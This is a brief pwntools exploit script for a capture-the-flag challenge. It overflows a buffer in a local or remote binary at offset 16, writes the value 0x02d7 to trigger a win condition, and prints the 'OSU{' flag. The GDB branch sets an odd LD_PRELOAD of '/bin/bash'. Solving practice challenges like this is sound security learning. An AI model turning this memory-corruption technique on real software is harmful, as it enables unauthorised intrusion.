#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD": "/bin/bash"})
    elif args.REMOTE: # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
'''.format(**locals())

exe = "./challenge"
elf = context.binary = ELF(exe, checksec=False)

io = start()
io.sendline(b"foo")

offset = 16
payload = flat({
    offset: [
        b'\x00' * 12, 
        p32(0x02d7)  
    ]
})

io.sendline(payload)

io.recvuntil(b"Wait, you got 727 pp?\n")
flag_line = io.recvline().decode().strip()
start_index = flag_line.find("OSU{")

flag = flag_line[start_index:]
log.success(f"Flag: {flag}")
